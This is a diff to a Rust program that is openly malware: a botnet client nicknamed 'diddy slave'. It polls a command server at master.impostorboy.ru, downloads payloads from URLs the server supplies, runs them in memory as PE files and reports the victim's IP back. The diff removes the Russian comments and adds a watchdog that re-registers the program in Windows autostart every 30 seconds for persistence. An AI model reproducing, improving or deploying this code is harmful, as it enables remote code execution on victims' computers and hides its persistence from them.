@@ -1,12 +1,14 @@
 use anyhow::{Context, Result};
+use auto_launch::{AutoLaunch, AutoLaunchBuilder, WindowsEnableMode};
 use maple_rs::Maple;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use tokio::time::{Duration, MissedTickBehavior, interval};
 
-const MASTER: &str = "http://master.impostorboy.ru"; // адрес дидди
-const POLL_INTERVAL: Duration = Duration::from_secs(60); // раз в минуту
-const RETRY_DELAY: Duration = Duration::from_secs(5); // старт паузы рестартов poll
+const MASTER: &str = "http://master.impostorboy.ru";
+const POLL_INTERVAL: Duration = Duration::from_secs(60);
+const RETRY_DELAY: Duration = Duration::from_secs(5);
+const AUTOSTART_INTERVAL: Duration = Duration::from_secs(30);
 
 #[derive(Clone, Deserialize)]
 struct Virus {
@@ -25,8 +27,10 @@ struct VirusResult {
 #[tokio::main]
 async fn main() -> Result<()> {
     let client = reqwest::Client::new();
+    tokio::spawn(autostart_watchdog());
+
     let mut tick = interval(POLL_INTERVAL);
-    tick.set_missed_tick_behavior(MissedTickBehavior::Delay); // если poll с рестартами занял дольше минуты — не догонять
+    tick.set_missed_tick_behavior(MissedTickBehavior::Delay);
 
     loop {
         tick.tick().await;
@@ -34,19 +38,16 @@ async fn main() -> Result<()> {
     }
 }
 
-// poll с рестартами: сломался — паникуем, ждём backoff и заново, пока не поедет
 async fn poll_with_retries(client: &reqwest::Client) {
     let mut delay = RETRY_DELAY;
 
     while let Err(err) = poll(client).await {
         eprintln!("poll сломался ({err:#}); рестартую через {delay:?}");
         tokio::time::sleep(delay).await;
-        // экспоненциальный backoff, но не дольше обычного интервала
         delay = (delay * 2).min(POLL_INTERVAL);
     }
 }
 
-// раз в минуту дергаем /poll; при наличии вирусов спавним запуск вируса с наименьшим id
 async fn poll(client: &reqwest::Client) -> Result<()> {
     let que: Vec<Virus> = client
         .get(format!("{MASTER}/poll"))
@@ -56,14 +57,13 @@ async fn poll(client: &reqwest::Client) -> Result<()> {
         .json()
         .await?;
 
-    // только ещё не принятые вирусы
     if let Some(virus) = que
         .iter()
         .filter(|virus| virus.status == "created")
         .min_by_key(|virus| virus.id)
         .cloned()
     {
-        tokio::spawn(run_virus(client.clone(), virus)); // асинхронно, не тормозим следующий poll
+        tokio::spawn(run_virus(client.clone(), virus));
     }
 
     Ok(())
@@ -76,10 +76,8 @@ async fn run_virus(client: reqwest::Client, virus: Virus) {
 }
 
 async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
-    // сразу присылаем статус accepted: out = наш ip, мастер кладёт ip -> id в pro
     send_accepted(&client, virus.id).await?;
 
-    // качаем virus url и исполняем
     let virus_bytes = client
         .get(&virus.url)
         .send()
@@ -95,10 +93,8 @@ async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
         module
             .execute_entry_point()
             .context("Не удалось выполнить точку входа PE-файл")?;
-        // module не Send — дропаем здесь, до .await ниже
     }
 
-    // исполнили — только потом ищем себя в pro
     seek_self_in_pro(&client, virus.id).await?;
 
     Ok(())
@@ -118,7 +114,6 @@ async fn send_accepted(client: &reqwest::Client, id: u64) -> Result<()> {
     Ok(())
 }
 
-// ищем себя в pro (ip -> id вируса), пока мастер не запишет нас туда
 async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
     let me = local_ip();
 
@@ -135,7 +130,6 @@ async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
         return Ok(());
     }
 
-    // нас не записали — перепосылаем accepted и смотрим ещё раз
     eprintln!("в pro нас нет — перепосылаю accepted");
     send_accepted(client, id).await?;
 
@@ -155,7 +149,45 @@ async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
     Ok(())
 }
 
-// ip, с которым выходим к мастеру (UDP connect пакеты не шлёт)
+async fn autostart_watchdog() {
+    let mut tick = interval(AUTOSTART_INTERVAL);
+    tick.set_missed_tick_behavior(MissedTickBehavior::Delay);
+
+    loop {
+        tick.tick().await;
+
+        let al = match check_autostart() {
+            Ok(al) => al,
+            Err(err) => {
+                eprintln!("autostart не собрался: {err:#}");
+                continue;
+            }
+        };
+
+        match tokio::task::spawn_blocking(move || -> Result<()> {
+            al.disable()?;
+            al.enable()?;
+            Ok(())
+        })
+        .await
+        {
+            Ok(Ok(())) => {}
+            Ok(Err(err)) => eprintln!("autostart сломался: {err:#}"),
+            Err(err) => eprintln!("autostart-таск сломался: {err}"),
+        }
+    }
+}
+
+fn check_autostart() -> Result<AutoLaunch> {
+    let app_path = std::env::current_exe().context("не нашёл свой собственный exe")?;
+    AutoLaunchBuilder::new()
+        .set_app_name("diddy slave")
+        .set_app_path(&app_path.to_string_lossy())
+        .set_windows_enable_mode(WindowsEnableMode::CurrentUser)
+        .build()
+        .context("не собрал auto-launch")
+}
+
 fn local_ip() -> String {
     std::net::UdpSocket::bind("0.0.0.0:0")
         .and_then(|sock| sock.connect("8.8.8.8:80").map(|_| sock))
